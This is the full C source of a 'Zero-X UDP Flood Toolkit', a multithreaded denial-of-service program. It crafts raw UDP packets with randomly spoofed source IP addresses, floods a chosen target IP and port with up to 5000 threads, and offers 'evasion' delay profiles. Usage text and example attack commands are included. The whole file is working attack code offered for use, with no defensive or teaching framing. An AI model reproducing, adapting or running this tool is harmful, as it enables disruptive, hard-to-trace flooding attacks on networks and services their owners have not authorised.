#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdbool.h>
#include <signal.h>
#include <time.h>
#include <pthread.h>
#include <math.h>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>

/* ================================================================
 * CONFIGURATION
 * ================================================================ */

#define MAX_THREADS        5000
#define MAX_PAYLOAD_SIZE   65535

/* Evasion profiles */
typedef enum {
    EVASION_NONE      = 0,
    EVASION_LOW       = 1,
    EVASION_MEDIUM    = 2,
    EVASION_HIGH      = 3,
    EVASION_PARANOID  = 4
} evasion_level_t;

/* Thread data structure */
typedef struct {
    char target_ip[16];
    int  target_port;
    int  duration;
    time_t expiration_time;
    int  thread_id;
    int  total_threads;
    evasion_level_t evasion;
    int  packet_delay_min;
    int  packet_delay_max;
    bool use_spoof;
    volatile bool *running;
} thread_data_t;

/* Global state */
static volatile bool g_running = true;
static pthread_mutex_t g_print_mutex = PTHREAD_MUTEX_INITIALIZER;

/* ================================================================
 * SIGNAL HANDLER (must be declared before use)
 * ================================================================ */

void handle_signal(int sig) {
    printf("\n\n[!] Caught signal %d. Shutting down gracefully...\n", sig);
    g_running = false;
}

/* ================================================================
 * UTILITY FUNCTIONS
 * ================================================================ */

unsigned short checksum(unsigned short *buf, int bufsz) {
    unsigned long sum = 0;
    while (bufsz > 1) {
        sum += *buf++;
        bufsz -= 2;
    }
    if (bufsz == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int random_int(int min, int max) {
    if (max <= min) return min;
    return min + rand() % (max - min + 1);
}

void random_ip(char *ip_str) {
    sprintf(ip_str, "%d.%d.%d.%d",
            random_int(1, 255), random_int(0, 255),
            random_int(0, 255), random_int(1, 255));
}

char* generate_payload(size_t size) {
    char *payload = malloc(size + 1);
    if (!payload) return NULL;
    for (size_t i = 0; i < size; i++)
        payload[i] = (char)random_int(0, 255);
    payload[size] = '\0';
    return payload;
}

/* ================================================================
 * UDP FLOOD ENGINE
 * ================================================================ */

/* Pseudo header for UDP checksum */
struct pseudo_hdr {
    u_int32_t src_addr;
    u_int32_t dst_addr;
    u_int8_t zero;
    u_int8_t protocol;
    u_int16_t udp_len;
};

void *flood_thread(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    time_t endtime = time(NULL) + data->duration;

    /* Create raw socket for spoofed packets */
    int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (raw_sock < 0) {
        /* Fallback to regular UDP */
        raw_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (raw_sock < 0) {
            pthread_mutex_lock(&g_print_mutex);
            fprintf(stderr, "[!] Thread %d: Cannot create socket: %s\n",
                    data->thread_id, strerror(errno));
            pthread_mutex_unlock(&g_print_mutex);
            pthread_exit(NULL);
        }
    }

    int one = 1;
    setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(data->target_port);
    inet_pton(AF_INET, data->target_ip, &dest.sin_addr);

    char packet[MAX_PAYLOAD_SIZE];
    char src_ip[16];
    int packet_count = 0;

    while (g_running && time(NULL) <= endtime) {
        memset(packet, 0, sizeof(packet));

        if (data->use_spoof && raw_sock >= 0) {
            /* Craft full IP + UDP packet with spoofed source */
            struct iphdr *iph = (struct iphdr *)packet;
            struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));

            int payload_size = random_int(64, 1400);
            char *payload = generate_payload(payload_size);
            if (!payload) continue;

            random_ip(src_ip);

            iph->ihl = 5;
            iph->version = 4;
            iph->tos = random_int(0, 255);
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size);
            iph->id = htons(random_int(1, 65535));
            iph->frag_off = 0;
            iph->ttl = random_int(48, 255);
            iph->protocol = IPPROTO_UDP;
            iph->check = 0;
            iph->saddr = inet_addr(src_ip);
            iph->daddr = dest.sin_addr.s_addr;

            udph->source = htons(random_int(1024, 65535));
            udph->dest = htons(data->target_port);
            udph->len = htons(sizeof(struct udphdr) + payload_size);
            udph->check = 0;

            memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), payload, payload_size);

            /* IP checksum */
            iph->check = checksum((unsigned short *)packet, sizeof(struct iphdr));

            /* UDP pseudo header checksum */
            struct pseudo_hdr psh;
            psh.src_addr = iph->saddr;
            psh.dst_addr = iph->daddr;
            psh.zero = 0;
            psh.protocol = IPPROTO_UDP;
            psh.udp_len = udph->len;

            int csum_len = sizeof(struct pseudo_hdr) + sizeof(struct udphdr) + payload_size;
            char *checksum_buf = malloc(csum_len);
            if (checksum_buf) {
                memset(checksum_buf, 0, csum_len);
                memcpy(checksum_buf, &psh, sizeof(struct pseudo_hdr));
                memcpy(checksum_buf + sizeof(struct pseudo_hdr), udph, sizeof(struct udphdr) + payload_size);
                udph->check = checksum((unsigned short *)checksum_buf, csum_len);
                free(checksum_buf);
            }

            int total_len = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;
            sendto(raw_sock, packet, total_len, 0,
                   (struct sockaddr *)&dest, sizeof(dest));

            free(payload);
        } else {
            /* Regular UDP flood */
            int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
            if (sock < 0) continue;

            int payload_size = random_int(64, 1024);
            char *payload = generate_payload(payload_size);
            if (!payload) { close(sock); continue; }

            dest.sin_port = htons(data->target_port);
            sendto(sock, payload, payload_size, 0,
                   (struct sockaddr *)&dest, sizeof(dest));
            close(sock);
            free(payload);
        }

        packet_count++;

        /* Evasion delay */
        if (data->evasion > EVASION_NONE) {
            int delay = random_int(data->packet_delay_min, data->packet_delay_max);
            if (delay > 0) usleep(delay);
        }

        /* Progress every 5000 packets */
        if (packet_count % 5000 == 0) {
            pthread_mutex_lock(&g_print_mutex);
            printf("\r[+] Thread %d: %d packets sent", data->thread_id, packet_count);
            fflush(stdout);
            pthread_mutex_unlock(&g_print_mutex);
        }
    }

    if (raw_sock >= 0) close(raw_sock);

    pthread_mutex_lock(&g_print_mutex);
    printf("\n[←] Thread %d finished: %d packets sent\n", data->thread_id, packet_count);
    pthread_mutex_unlock(&g_print_mutex);

    pthread_exit(NULL);
}

void run_flood(const char *ip, int port, int duration, int threads,
               evasion_level_t evasion, bool spoof) {
    printf("\n╔══════════════════════════════════════════════════╗\n");
    printf("║        Zero-X UDP Flood Engine                  ║\n");
    printf("╠══════════════════════════════════════════════════╣\n");
    printf("║ Target:   %s:%-36d ║\n", ip, port);
    printf("║ Duration: %d seconds%-34s ║\n", duration, "");
    printf("║ Threads:  %-40d ║\n", threads);
    printf("║ Evasion:  %-40s ║\n",
           evasion == EVASION_NONE ? "None" :
           evasion == EVASION_LOW ? "Low" :
           evasion == EVASION_MEDIUM ? "Medium" :
           evasion == EVASION_HIGH ? "High" : "Paranoid");
    printf("║ Spoofing: %-40s ║\n", spoof ? "Enabled (random IP)" : "Disabled");
    printf("╚══════════════════════════════════════════════════╝\n\n");

    if (getuid() != 0 && spoof) {
        printf("[!] Spoofing requires root. Disabling spoof.\n");
        printf("[!] Run with: sudo ./zerox flood ... for spoofing\n\n");
        spoof = false;
    }

    pthread_t thread_ids[threads];
    thread_data_t data[threads];

    for (int i = 0; i < threads; i++) {
        memset(&data[i], 0, sizeof(thread_data_t));
        strncpy(data[i].target_ip, ip, 15);
        data[i].target_ip[15] = '\0';
        data[i].target_port = port;
        data[i].duration = duration;
        data[i].expiration_time = time(NULL) + duration;
        data[i].thread_id = i;
        data[i].total_threads = threads;
        data[i].evasion = evasion;
        data[i].use_spoof = spoof;
        data[i].running = &g_running;
        data[i].packet_delay_min = (evasion >= EVASION_HIGH) ? 1000 : 0;
        data[i].packet_delay_max = (evasion == EVASION_PARANOID) ? 50000 :
                                   (evasion == EVASION_HIGH) ? 10000 :
                                   (evasion == EVASION_MEDIUM) ? 1000 : 0;

        int ret = pthread_create(&thread_ids[i], NULL, flood_thread, &data[i]);
        if (ret != 0) {
            fprintf(stderr, "[!] Failed to create thread %d: %s\n", i, strerror(ret));
        }
    }

    /* Wait for duration or Ctrl+C */
    time_t start = time(NULL);
    while (g_running && (time(NULL) - start) < duration) {
        sleep(1);
        int elapsed = (int)(time(NULL) - start);
        printf("\r[⟳] Elapsed: %ds / %ds", elapsed, duration);
        fflush(stdout);
    }

    g_running = false;

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    printf("\n\n╔══════════════════════════════════════════════════╗\n");
    printf("║           Flood Complete                        ║\n");
    printf("╚══════════════════════════════════════════════════╝\n");
}

/* ================================================================
 * BANNER & USAGE
 * ================================================================ */

void print_banner() {
    printf("\n");
    printf("  ███████╗███████╗██████╗  ██████╗ ██╗  ██╗\n");
    printf("  ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗╚██╗██╔╝\n");
    printf("    ███╔╝ █████╗  ██████╔╝██║   ██║ ╚███╔╝ \n");
    printf("   ███╔╝  ██╔══╝  ██╔══██╗██║   ██║ ██╔██╗ \n");
    printf("  ███████╗███████╗██║  ██║╚██████╔╝██╔╝ ██╗\n");
    printf("  ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝\n");
    printf("  ═══════ UDP Flood Toolkit ════════════════\n");
    printf("  Version 3.0 — Multi-Threaded | Stealth | Spoof\n\n");
}

void print_usage() {
    printf("USAGE:\n");
    printf("  ./zerox flood <IP> <PORT> <TIME> <THREADS> [evasion] [spoof|nospoof]\n\n");
    printf("DESCRIPTION:\n");
    printf("  UDP flood attack engine with multithreading and evasion\n\n");
    printf("ARGUMENTS:\n");
    printf("  IP        - Target IP address\n");
    printf("  PORT      - Target UDP port\n");
    printf("  TIME      - Duration in seconds\n");
    printf("  THREADS   - Number of threads (1-%d)\n", MAX_THREADS);
    printf("  evasion   - (optional) 0=None 1=Low 2=Medium 3=High 4=Paranoid (default: 2)\n");
    printf("  spoof/nospoof - (optional) Enable/disable IP spoofing (default: spoof)\n\n");
    printf("EVASION LEVELS:\n");
    printf("  0 = None    - Max speed, no delays\n");
    printf("  1 = Low     - Slight jitter between packets\n");
    printf("  2 = Medium  - Random delays + varied payload sizes\n");
    printf("  3 = High    - Full spoof + jitter + slow rate\n");
    printf("  4 = Paranoid - Everything + very slow drip\n\n");
    printf("EXAMPLES:\n");
    printf("  sudo ./zerox flood 192.168.1.100 53 30 200\n");
    printf("  sudo ./zerox flood 192.168.1.100 80 60 500 3\n");
    printf("  sudo ./zerox flood 192.168.1.100 443 120 1000 4 nospoof\n");
    printf("  ./zerox flood 10.0.0.5 8080 10 50 0 nospoof  (no root needed)\n\n");
}

/* ================================================================
 * MAIN
 * ================================================================ */

int main(int argc, char *argv[]) {
    signal(SIGINT, handle_signal);
    srand(time(NULL) ^ (getpid() << 16));

    if (argc < 2 || strcmp(argv[1], "--help") == 0 || strcmp(argv[1], "-h") == 0) {
        print_banner();
        print_usage();
        return 0;
    }

    if (strcmp(argv[1], "flood") != 0) {
        print_banner();
        printf("[!] This version only supports 'flood' mode.\n\n");
        print_usage();
        return 1;
    }

    /* ---- FLOOD MODE ---- */
    if (argc < 5) {
        print_banner();
        printf("[!] Usage: ./zerox flood <IP> <PORT> <TIME> <THREADS> [evasion] [spoof|nospoof]\n");
        return 1;
    }

    const char *ip = argv[2];
    int port = atoi(argv[3]);
    int duration = atoi(argv[4]);
    int threads = atoi(argv[5]);

    if (port < 0 || port > 65535) {
        printf("[!] Invalid port: %d (must be 0-65535)\n", port);
        return 1;
    }
    if (duration < 1) {
        printf("[!] Invalid duration: %d (must be >= 1)\n", duration);
        return 1;
    }
    if (threads < 1) threads = 1;
    if (threads > MAX_THREADS) threads = MAX_THREADS;

    evasion_level_t evasion = EVASION_MEDIUM;
    bool spoof = true;

    if (argc > 6) {
        int ev = atoi(argv[6]);
        if (ev >= 0 && ev <= 4) evasion = (evasion_level_t)ev;
    }

    if (argc > 7) {
        if (strcmp(argv[7], "nospoof") == 0) spoof = false;
    }

    print_banner();
    run_flood(ip, port, duration, threads, evasion, spoof);

    return 0;
}
